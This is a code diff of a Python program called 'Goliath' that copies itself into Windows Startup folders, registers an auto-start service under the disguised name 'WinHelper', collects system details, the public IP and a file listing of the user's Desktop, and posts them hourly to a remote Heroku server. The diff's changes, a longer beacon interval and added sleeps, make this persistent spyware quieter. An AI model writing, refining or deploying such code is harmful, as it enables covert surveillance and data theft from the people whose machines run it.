@@ -2,7 +2,6 @@ import os
 import sys
 import shutil
 import subprocess
-import json
 import platform
 import time
 import shlex
@@ -13,33 +12,31 @@ from fluffyreq import post_json_to_server, get_host_ip
 
 # Create log instance
 log = fluffylog.FluffyLog()
-log.info('Goliath Online...')
+log.info('Goliath On line...')
 
 
 # Necessary variables
-win7_common_startup =\
+WIN7_COMMON_STARTUP =\
     'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-win7_user_startup =\
+WIN7_USER_STARTUP =\
     os.path.join(
         os.path.expanduser("~"),
         '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-server_url = 'https://tranquil-caverns-83807.herokuapp.com/json'
-log_url = 'https://tranquil-caverns-83807.herokuapp.com/logs'
-user_home = os.path.expanduser("~\Desktop")
-myself = os.path.basename(sys.argv[0])
-lock_file = '{}'.format(os.path.join(os.path.expanduser('~'), 'WinHelp.lock'))
-# For testing
-# user_home = os.path.expanduser('~/MyApps/school/introduction python')
-sc_line = '''sc create SuperAwesomeWindowsHelper
+MAIN_DATA_URL = 'https://tranquil-caverns-83807.herokuapp.com/json'
+LOG_URL = 'https://tranquil-caverns-83807.herokuapp.com/logs'
+USER_HOME = os.path.expanduser("~\Desktop")
+MYSELF = os.path.basename(sys.argv[0])
+LOCK_FILE = '{}'.format(os.path.join(os.path.expanduser('~'), 'WinHelp.lock'))
+SC_LINE = '''sc create SuperAwesomeWindowsHelper
 binPath= "{}"
 DisplayName= "WinHelper"
-start= auto'''.format(os.path.join(user_home, myself))
-whats_my_ip = 'http://ipv4bot.whatismyipaddress.com/'
+start= auto'''.format(os.path.join(USER_HOME, MYSELF))
+WHATS_MY_IP = 'http://ipv4bot.whatismyipaddress.com/'
 
 
 # Functions
 def copy_to_dir(dir_path):
-    if os.path.isfile(os.path.join(dir_path, myself)):
+    if os.path.isfile(os.path.join(dir_path, MYSELF)):
         log.debug("I'm already in ({}), skipping".format(dir_path))
     else:
         if os.path.exists(dir_path):
@@ -54,24 +51,24 @@ def copy_to_dir(dir_path):
 
 def copy_to_startup():
     try:
-        copy_to_dir(win7_common_startup)
+        copy_to_dir(WIN7_COMMON_STARTUP)
     except Exception as e:
         raise e
-        copy_to_dir(win7_user_startup)
+        copy_to_dir(WIN7_USER_STARTUP)
 
 
 def copy_to_user_dir():
     try:
-        copy_to_dir(user_home)
+        copy_to_dir(USER_HOME)
     except Exception as e:
         raise e
 
 
 def check_lock():
     try:
-        if os.path.isfile(lock_file):
-            os.remove(lock_file)
-        os.open(lock_file, os.O_CREAT | os.O_EXCL | os.O_RDWR)
+        if os.path.isfile(LOCK_FILE):
+            os.remove(LOCK_FILE)
+        os.open(LOCK_FILE, os.O_CREAT | os.O_EXCL | os.O_RDWR)
     except OSError:
         exit()
 
@@ -102,6 +99,8 @@ def gather_dir_info(dir_path):
                 if os.path.isfile(os.path.join(root, f)):
                     stat = os.stat(os.path.join(root, f))
                     dir_files.append({'name': f, 'stats': stat})
+            # wait for 2 seconds on every folder, so cpu is not taxed
+            time.sleep(2)
             all_files.append({'folder': root, 'files': dir_files})
         file_data.update({'data': all_files})
         log.info('Finished dir info ({})'.format(dir_path))
@@ -178,37 +177,36 @@ def main():
     while True:
         try:
             next_call = time.time()
-            ip_req_response = get_host_ip(whats_my_ip)
+            ip_req_response = get_host_ip(WHATS_MY_IP)
             # TODO: Merge with file search
-            md5hash = checksumdir.dirhash(user_home, 'md5')
+            md5hash = checksumdir.dirhash(USER_HOME, 'md5')
 
             copy_to_startup()
             copy_to_user_dir()
-            run_cmd(sc_line)
+            run_cmd(SC_LINE)
             pc_i = gather_pc_info()
-            dir_i = gather_dir_info(user_home)
+            dir_i = gather_dir_info(USER_HOME)
             all_data = {'ip': ip_req_response['ip'],
                         'pc_data': pc_i,
                         'file_data': dir_i,
-                        'user_home_hash': md5hash}
-            all_data_json = json.dumps(all_data)
+                        'USER_HOME_hash': md5hash}
 
-            log.debug('Sending data to ({})'.format(server_url))
-            resp = post_json_to_server(server_url, all_data_json)
-            # print(all_data_json)
+            log.debug('Sending data to ({})'.format(MAIN_DATA_URL))
+            resp = post_json_to_server(MAIN_DATA_URL, all_data)
+
             if resp == -1:
                 log.warning('Sending failed')
             else:
                 log.debug('Json sent, response ({})'.format(resp))
 
         except Exception as e:
-            log.error('Unknown exeption found:\n({0})'.format(e))
+            log.error('Unknown exception found:\n({0})'.format(e))
         finally:
             log.info('Sending log to server')
-            log.debug('End of loop, will wait for {} seconds'.format(300))
-            log.flush(log_url)
+            log.debug('End of loop, will wait for {} seconds'.format(3600))
+            log.flush(LOG_URL)
 
-            next_call = next_call + int(300)
+            next_call = next_call + int(3600)
             if (next_call - time.time()) <= 0:
                 time.sleep(1)
             else:
